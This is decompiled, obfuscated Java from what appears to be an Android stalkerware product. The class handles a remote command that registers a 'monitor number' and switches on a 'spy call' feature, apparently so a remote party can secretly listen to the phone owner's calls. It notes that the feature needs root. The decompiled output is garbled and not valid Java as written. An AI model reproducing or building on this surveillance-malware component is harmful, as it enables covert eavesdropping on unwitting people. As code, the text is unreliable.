package com.vvt.remotecommand.processor.f;

import com.vvt.base.FeatureId;
import com.vvt.remotecommand.RemoteCommand;
import com.vvt.remotecommand.exception.InvalidCommanFormatException;
import com.vvt.remotecommand.exception.RemoteCommandException;
import com.vvt.remotecommand.exception.RequiresRootException;
import com.vvt.remotecommand.processor.RemoteCommandProcessor;
import com.vvt.remotecommand.processor.RemoteCommandProcessor.QueueCategory;
import com.vvt.remotecommand.processor.c;
import com.vvt.remotecommand.processor.misc.ManageCommonDataConstant.CommonData;
import com.vvt.remotecontrol.ControlCommand;
import com.vvt.remotecontrol.RemoteFunction;
import com.vvt.remotecontrol.b;
import com.vvt.remotecontrol.output.RmtCtrlOutputSettings;
import java.util.ArrayList;
import java.util.List;

public class a
  extends RemoteCommandProcessor
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.e;
  
  public a(com.vvt.remotecontrol.a parama)
  {
    super(parama);
  }
  
  protected String a(String paramString)
  {
    Object localObject1 = b.b(h());
    Object localObject2 = FeatureId.SPY_CALL;
    boolean bool1 = ((RmtCtrlOutputSettings)localObject1).getFeatureStatus((FeatureId)localObject2);
    Object localObject3 = FeatureId.MONITOR_NUMBER;
    localObject3 = ((RmtCtrlOutputSettings)localObject1).getCommonData((FeatureId)localObject3);
    boolean bool2 = ((List)localObject3).contains(paramString);
    String str = "Spycall is %s ";
    int j = 1;
    Object[] arrayOfObject = new Object[j];
    if (bool1)
    {
      localObject1 = "enabled";
      arrayOfObject[0] = localObject1;
      localObject1 = String.format(str, arrayOfObject);
      if (localObject3 != null)
      {
        int i = ((List)localObject3).size();
        if ((i != 0) && (bool2)) {
          break label135;
        }
      }
      localObject2 = new java/lang/StringBuilder;
      ((StringBuilder)localObject2).<init>();
      localObject1 = ((StringBuilder)localObject2).append((String)localObject1);
      localObject2 = "\nMonitor number is not set.";
    }
    for (localObject1 = (String)localObject2;; localObject1 = (String)localObject2 + paramString)
    {
      return (String)localObject1;
      localObject1 = "disabled";
      break;
      label135:
      localObject2 = new java/lang/StringBuilder;
      ((StringBuilder)localObject2).<init>();
      localObject1 = ((StringBuilder)localObject2).append((String)localObject1);
      localObject2 = "with ";
    }
  }
  
  public void a(RemoteCommand paramRemoteCommand, c paramc)
  {
    int i = 1;
    boolean bool1 = false;
    Object localObject1 = null;
    boolean bool2 = a;
    if (bool2) {}
    Object localObject2 = paramRemoteCommand.getParameters();
    bool2 = a;
    if (bool2) {}
    int j = ((ArrayList)localObject2).size();
    if (j != i)
    {
      localObject3 = new com/vvt/remotecommand/exception/InvalidCommanFormatException;
      ((InvalidCommanFormatException)localObject3).<init>();
      throw ((Throwable)localObject3);
    }
    Object localObject3 = (String)((ArrayList)localObject2).get(0);
    boolean bool4 = a;
    if (bool4) {}
    bool4 = a;
    if (bool4) {}
    com.vvt.remotecontrol.a locala = h();
    bool4 = a;
    if (bool4) {}
    Object localObject4 = new com/vvt/remotecontrol/ControlCommand;
    Object localObject5 = RemoteFunction.DEBUG_IS_FULL_MODE;
    ((ControlCommand)localObject4).<init>((RemoteFunction)localObject5, null);
    localObject4 = locala.execute((ControlCommand)localObject4);
    boolean bool5 = localObject4 instanceof Boolean;
    if (bool5)
    {
      localObject4 = (Boolean)localObject4;
      bool4 = ((Boolean)localObject4).booleanValue();
      bool1 = a;
      if (bool1) {}
      bool1 = a;
      if (bool1) {}
      localObject1 = ManageCommonDataConstant.CommonData.CODE_ADD_MONITOR.getFeatureId();
      b.a(locala, (FeatureId)localObject1, (List)localObject2);
      bool1 = a;
      if (bool1) {}
      localObject1 = new com/vvt/remotecontrol/ControlCommand;
      localObject2 = RemoteFunction.ENABLE_SPY_CALL;
      localObject5 = Boolean.valueOf(i);
      ((ControlCommand)localObject1).<init>((RemoteFunction)localObject2, localObject5);
      locala.execute((ControlCommand)localObject1);
      if (paramc != null)
      {
        if (bool4) {
          break label309;
        }
        localObject3 = new com/vvt/remotecommand/exception/RequiresRootException;
        localObject4 = "The setting has been changed, however this feature requires root permission.";
        ((RequiresRootException)localObject3).<init>((String)localObject4);
        paramc.a(paramRemoteCommand, this, (RemoteCommandException)localObject3);
      }
    }
    for (;;)
    {
      boolean bool3 = a;
      if (bool3) {}
      return;
      bool4 = b;
      if (bool4) {}
      bool4 = false;
      localObject4 = null;
      break;
      label309:
      localObject3 = a((String)localObject3);
      bool4 = a;
      if (bool4) {}
      paramc.b(paramRemoteCommand, this, (String)localObject3);
    }
  }
  
  public RemoteCommandProcessor.QueueCategory d()
  {
    return RemoteCommandProcessor.QueueCategory.MAIN;
  }
  
  public String e()
  {
    return "ProEnableSpyCallWithMonitor";
  }
  
  public boolean f()
  {
    return true;
  }
  
  public long g()
  {
    return 0L;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/remotecommand/processor/f/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */